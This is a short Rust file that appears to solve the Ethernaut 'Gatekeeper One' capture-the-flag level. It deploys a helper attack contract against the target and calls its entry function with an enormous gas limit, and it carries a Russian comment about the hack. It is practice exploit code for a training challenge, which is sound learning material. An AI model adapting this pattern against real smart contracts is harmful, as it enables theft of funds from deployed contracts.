use crate::abi::let_me_in::LetMeIn;
use async_trait::async_trait;
use ctf::ethernaut::lvl13_gatekeeper_one::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let hack_contract =
            LetMeIn::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        //вызываем нашу функцию хака и закидываю мильоны газа,
        // чтобы точно хватило
        hack_contract
            .go_inside(offender.address())
            .gas(1000000000000_i128)
            .call()
            .await?;
        Ok(())
    }
}
